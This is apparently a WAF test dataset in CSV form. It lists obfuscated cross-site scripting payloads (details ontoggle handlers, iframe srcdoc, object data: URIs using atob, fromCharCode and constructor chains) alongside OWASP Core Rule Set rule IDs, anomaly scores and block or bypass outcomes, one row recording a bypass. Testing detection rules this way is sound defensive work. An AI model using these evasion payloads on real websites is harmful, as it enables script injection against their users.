index,payload,model,syntax,crs,rule_count,rule_ids,rule_refs,total_score,unique_id
2837,<article><details open ontoggle=(function(){window['al'+'ert']`1`})()>,0,1,block,6,"934100,934100,941100,941120,941370,949110","o33,11v217,70 || o33,11v217,70t:urlDecodeUni || v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o22,10v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o44,18v217,70t:urlDecodeUni,t:compressWhitespace || ",25,178032668979.940946
2839,<article><details open ontoggle=(function(){this['constructor']['constructor']('al'+'ert(1)')()})()>,0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o32,67v217,100t:urlDecode,t:replaceComments,t:compressWhitespace || o33,11v217,100 || o33,11v217,100t:urlDecodeUni || v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o22,10v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o44,19v217,100t:urlDecodeUni,t:compressWhitespace || ",30,178032669272.119096
2841,<article><details open ontoggle=(function(){top[atob('YWxlcnQ=')]`1`})()>,0,1,block,6,"932105,934100,941100,941120,941370,949110","o41,6v217,73 || o33,11v217,73 || v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o22,10v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o44,21v217,73t:urlDecodeUni,t:compressWhitespace || ",25,178032669685.602931
2843,<article><details open ontoggle=(function(){globalThis['al'+'ert']`1`})()>,0,1,block,5,"934100,934100,941100,941120,949110","o33,11v217,74 || o33,11v217,74t:urlDecodeUni || v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o22,10v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,178032669941.663558
2849,"<article><details open ontoggle=(function(){(1,self['al'+'ert'])`1`})()>",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o32,39v217,72t:urlDecode,t:replaceComments,t:compressWhitespace || o33,11v217,72 || o33,11v217,72t:urlDecodeUni || v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o22,10v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o47,16v217,72t:urlDecodeUni,t:compressWhitespace || ",30,178032671087.214882
2850,"<article><details open ontoggle=(function(){(1,[]['constructor']['constructor']('al'+'ert(1)')())})()>",0,1,block,6,"933210,934100,934100,941100,941120,949110","o32,69v217,102t:urlDecode,t:replaceComments,t:compressWhitespace || o33,11v217,102 || o33,11v217,102t:urlDecodeUni || v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o22,10v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,178032671233.230650
2851,"<article><details open ontoggle=(function(){(1,top['ale'+'rt'])`1`})()>",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o32,38v217,71t:urlDecode,t:replaceComments,t:compressWhitespace || o33,11v217,71 || o33,11v217,71t:urlDecodeUni || v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o22,10v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o47,15v217,71t:urlDecodeUni,t:compressWhitespace || ",30,178032671467.902847
2852,"<article><details open ontoggle=(function(){(1,globalThis['al'+'ert'])`1`})()>",0,1,block,6,"933210,934100,934100,941100,941120,949110","o32,45v217,78t:urlDecode,t:replaceComments,t:compressWhitespace || o33,11v217,78 || o33,11v217,78t:urlDecodeUni || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o22,10v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,17803267157.357656
2853,<article><details open ontoggle=window['Function']`return\x20window['ale'+'rt'](1)`()>,0,1,block,5,"933210,941100,941120,941370,949110","o67,18v217,86t:urlDecode,t:replaceComments,t:compressWhitespace || v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o22,10v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o32,18v217,86t:urlDecodeUni,t:compressWhitespace || ",20,178032671719.152497
2854,<article><details open ontoggle=(function(){return[top]['pop']()['ale'+'rt']`1`})()>,0,1,block,6,"933210,934100,934100,941100,941120,949110","o32,51v217,84t:urlDecode,t:replaceComments,t:compressWhitespace || o33,11v217,84 || o33,11v217,84t:urlDecodeUni || v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o22,10v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,178032671925.587466
2856,<article><details open ontoggle=(function(){return[window]['shift']()['ale'+'rt']`1`})()>,0,1,block,6,"933210,934100,934100,941100,941120,949110","o32,56v217,89t:urlDecode,t:replaceComments,t:compressWhitespace || o33,11v217,89 || o33,11v217,89t:urlDecodeUni || v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o22,10v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,178032672284.344804
2859,<details open ontoggle=window['Function'].constructor.constructor('ale'+'rt(1)')()>,0,1,block,4,"941100,941120,941370,949110","v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o23,18v217,83t:urlDecodeUni,t:compressWhitespace || ",15,178032672843.557379
2891,"<details open ontoggle=Function.prototype.call.call(Function,null,'ale'+'rt(1)')()>",0,1,bypass,2,"941100,941120","v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,178032678622.686869
2901,"<iframe srcdoc=""<script>globalThis['Function']('retu'+'rn al'+'ert')()(1)</script>"">",0,1,block,5,"933210,941100,941110,941160,949110","o34,39v217,84t:urlDecode,t:replaceComments,t:compressWhitespace || v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,178032680356.683008
2903,"<iframe srcdoc=""<script>with(document)with(defaultView)Function('retu'+'rn al'+'ert')()(1)</script>"">",0,1,block,5,"933210,941100,941110,941160,949110","o28,62v217,101t:urlDecode,t:replaceComments,t:compressWhitespace || v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,178032680720.443760
2933,"<iframe srcdoc=""&lt;details open ontoggle&equals;parent&lsqb;&grave;&bsol;u0041rray&grave;&rsqb;&lsqb;&grave;&bsol;u0063onstructor&grave;&rsqb;&lsqb;&grave;constru&grave;&plus;&grave;ctor&grave;&rsqb;&lpar;atob&lpar;&grave;YWxlcnQoMSk&equals;&grave;&rpar;&rpar;&lpar;&rpar;&gt;&lt;&sol;details&gt;""></iframe>",0,1,block,4,"941100,941160,942100,949110","v217,308t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,308t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v217,308 || ",15,178032686265.789801
2952,"<object type=""text/html"" data=""data:text/html;,<script>(globalThis['\u0046unction'](globalThis['\u0061to\u0062']('YWxlcnQoMTIp')))()</script>"">",0,1,block,9,"932130,941100,941110,941130,941140,941160,941170,941300,949110","o50,69v217,143t:urlDecodeUni,t:cmdLine || v217,143t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o47,8v217,143t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,15v217,143t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,55v217,143t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,143t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,16v217,143t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,143t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",40,178032689771.834120
2968,"<object data=""data:text/html,<script>Object['constr'%2b'uctor']['constr'%2b'uctor']('al'%2b'ert(1)')()</script>""></object>",0,1,block,8,"941100,941110,941130,941140,941160,941170,941300,949110","v217,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,178032692665.816526
2976,"<object data=""data:text/html,<script>globalThis[Function.name](String.fromCharCode(97,108,101,114,116,40,49,41))()</script>""></object>",0,1,block,10,"933210,934100,941100,941110,941130,941140,941160,941170,941300,949110","o47,67v217,134t:urlDecode,t:replaceComments,t:compressWhitespace || o63,19v217,134 || v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",45,178032694167.899480
2977,"<object data=""data:text/html,<sc&#x72;ipt>globalThis[(1,Function).constructor.name](unescape('%61%6c%65%72%74%28%31%29'))()</sc&#x72;ipt>""></object>",0,1,block,8,"941100,941110,941130,941140,941160,941170,941300,949110","v217,148t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,148t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,148t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,148t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,148t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,148t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,148t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,178032694336.194585
2978,"<object data=""data:text/html,<script>globalThis[``+[1,Function][1].name+``](unescape('%'+'61%'+'6c%'+'65%'+'72%'+'74%'+'28%'+'31%'+'29'))()</script>""></object>",0,1,block,8,"941100,941110,941130,941140,941160,941170,941300,949110","v217,159t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,159t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,159t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,159t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,159t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,159t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,159t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,178032694427.273751
2979,"<object data=""data:text/html,<script>self[(1,Function).constructor.name](decodeURIComponent('%61%6C%65%72%74%281%29'))()</script>""></object>",0,1,block,9,"941100,941110,941130,941140,941160,941170,941300,941370,949110","v217,140t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,140t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,140t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,140t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,140t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,140t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,140t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o37,35v217,140t:urlDecodeUni,t:compressWhitespace || ",40,17803269461.538645
2998,"<object data='data:application/xml,<svg xmlns=""http://www.w3.org/2000/svg""><script>globalThis[String.fromCharCode(70,117,110,99,116,105,111,110)][String.fromCharCode(99,111,110,115,116,114,117,99,116,111,114)](String.fromCharCode(114,101,116,117,114,110,32,101,118,97,108))()(atob(""YWxlcnQoMSk=""))</script></svg>'></object>",0,1,block,9,"934100,941100,941110,941130,941140,941160,941170,941300,949110","o94,19v217,323 || v217,323t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o75,8v217,323t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o39,6v217,323t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,75v217,323t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,323t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,22v217,323t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,323t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",40,178032698145.621014
3000,"<object data='data:text/html,<svg xmlns=""http://www.w3.org/2000/svg""><script>Function.prototype.call.call(eval,null,atob(""YWxlcnQoMSk=""))</script></svg>'></object>",0,1,block,8,"941100,941110,941130,941140,941160,941170,941300,949110","v217,163t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o69,8v217,163t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,163t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,69v217,163t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,163t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,163t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,163t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,178032698446.058780
3003,"<object data='data:text/html,<svg xmlns=""http://www.w3.org/2000/svg""><script>window[(()=>""eval"")()]([atob(""YWxlcnQoMSk="")][0])</script></svg>'></object>",0,1,block,10,"933210,941100,941110,941130,941140,941160,941170,941300,941370,949110","o96,30v217,152t:urlDecode,t:replaceComments,t:compressWhitespace || v217,152t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o69,8v217,152t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,152t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,69v217,152t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,152t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,152t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,152t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o77,22v217,152t:urlDecodeUni,t:compressWhitespace || ",45,178032699096.468562
3020,"<object data='data:text/html;charset=utf-8,<svg/xmlns=""http://www.w3.org/2000/svg""><script>[][""constructor""][""constructor""](String.fromCharCode(97,108,101,114,116,40,49,41))()</script></svg>'></object>",0,1,block,10,"933210,934100,941100,941110,941130,941140,941160,941170,941300,949110","o91,84v217,201t:urlDecode,t:replaceComments,t:compressWhitespace || o124,19v217,201 || v217,201t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o83,8v217,201t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,201t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,83v217,201t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,201t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,201t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,201t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",45,178032702189.136775
3021,"<object data='data:text/html,<svg xmlns=""http://www.w3.org/2000/svg""><script>Array.prototype.constructor.constructor(atob`YWxlcnQoMSk=`)()</script></svg>' type='text/html'></object>",0,1,block,8,"941100,941110,941130,941140,941160,941170,941300,949110","v217,181t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o69,8v217,181t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,181t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,69v217,181t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,181t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,181t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,181t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,178032702326.208344
3023,"<object data='data:text/html,<svg xmlns=""http://www.w3.org/2000/svg""><script>Function(atob(""YWxlcnQoMSk=""))()</script></svg>' type='text/html'></object>",0,1,block,8,"941100,941110,941130,941140,941160,941170,941300,949110","v217,152t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o69,8v217,152t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,152t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,69v217,152t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,152t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,152t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,152t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,178032702659.927146
3032,"<object type='text/html' data='data:text/html,<math><mtext><script>Function(""ale""+""rt(1)"")()</script></mtext></math>'></object>",0,1,block,8,"941100,941110,941130,941140,941160,941170,941300,949110","v217,127t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o59,8v217,127t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,15v217,127t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,52v217,127t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,127t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,16v217,127t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,127t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,178032704275.112998
